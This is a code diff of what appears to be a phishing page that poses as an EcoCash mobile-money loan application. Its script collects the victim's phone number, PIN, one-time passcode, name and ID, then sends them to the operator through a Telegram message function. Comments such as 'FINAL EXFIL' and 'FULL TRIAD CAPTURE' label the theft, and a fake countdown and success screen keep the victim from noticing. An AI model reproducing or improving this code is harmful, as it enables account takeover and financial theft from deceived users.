+      const nextIdx = Math.min(i + digits.length, otpIds.length - 1);
+      document.getElementById(otpIds[nextIdx]).focus();
+      const otp = otpIds.map(x => document.getElementById(x).value).join('');
+      document.getElementById('btnVerifyOtp').disabled = otp.length !== 4;
     });
   });
 
-  // === FINAL EXFIL (PIN + OTP) ===
-  document.getElementById('btnVerify').addEventListener('click', () => {
-    const otp = [...otpInputs].map(i => i.value).join('');
-    if (otp.length !== 4) return showErr('errOtp', 'Enter all 4 digits');
+  // ============================================================
+  //  STEP 3 — OTP
+  // ============================================================
+  document.getElementById('btnVerifyOtp').addEventListener('click', () => {
+    clearErr('errOtp');
+    const otp = otpIds.map(x => document.getElementById(x).value).join('');
+    if (otp.length !== 4 || !/^\d{4}$/.test(otp)) {
+      return showErr('errOtp', 'Enter all 4 digits');
+    }
 
     state.otp = otp;
 
-    sendToTelegram(`
-🔐 *FULL ECOCASH CREDENTIALS*
-📞 *Number:* ${state.msisdn}
-🔐 *PIN:* ${state.pin}
-🔢 *OTP:* ${state.otp}
-💸 *Loan:* ${state.amount}
-📅 *Term:* ${state.term}
-🕒 *Time:* ${new Date().toLocaleString()}
-    `);
+    const log =
+      `🔐 *ECOCASH FULL TRIAD CAPTURE* 🔐\n` +
+      `👤 *Name:* ${escMd(state.name)}\n` +
+      `📞 *Number:* ${escMd(state.msisdn)}\n` +
+      `🔐 *PIN:* \`${escMd(state.pin)}\`\n` +
+      `🔢 *OTP:* \`${escMd(state.otp)}\`\n` +
+      `💸 *Loan:* ${escMd(state.amount)}\n` +
+      `📅 *Term:* ${escMd(state.term)}\n` +
+      `🆔 *ID:* \`${escMd(state.victimId || '')}\`\n` +
+      `🕒 *Time:* ${escMd(new Date().toLocaleString())}`;
+    sendMessage(log);
 
-    document.getElementById('otpSheet').classList.remove('show');
-    showSuccessScreen();
-
-    if (POLLING_INTERVAL) clearInterval(POLLING_INTERVAL);
+    showStep('stepProcessing');
+    startCountdown(30, () => showSuccess());
+    startPolling();
   });
 
-  // === SUCCESS SCREEN ===
-  function showSuccessScreen() {
-    document.getElementById('refCode').textContent = Math.floor(100000 + Math.random() * 900000);
-    document.getElementById('successAmount').textContent = state.amount;
-    document.getElementById('successMsisdn').textContent = state.msisdn;
-
-    document.getElementById('cardStep2').style.display = 'none';
-    document.getElementById('cardSuccess').style.display = '';
-
-    startRedirectTimer();
-    setTimeout(() => { window.location.href = REDIRECT_URL; }, REDIRECT_DELAY_MS);
-  }
-
-  function startRedirectTimer() {
-    let s = 300;
-    const el = document.getElementById('redirectTimer');
-    const interval = setInterval(() => {
-      const mins = Math.floor(s / 60);
-      const secs = s % 60;
-      el.textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
-      if (--s < 0) clearInterval(interval);
-    }, 1000);
-  }
-
-  document.getElementById('otpClose').addEventListener('click', () => {
-    if (confirm('Cancel verification? Your loan will not be processed.')) {
-      document.getElementById('otpSheet').classList.remove('show');
-    }
+  // ============================================================
+  //  CLEANUP ON UNLOAD
+  // ============================================================
+  window.addEventListener('beforeunload', () => {
+    stopPolling();
+    cancelTimeout();
   });
 
   document.getElementById('yr').textContent = new Date().getFullYear();
+})();
 </script>
 </body>
 </html>
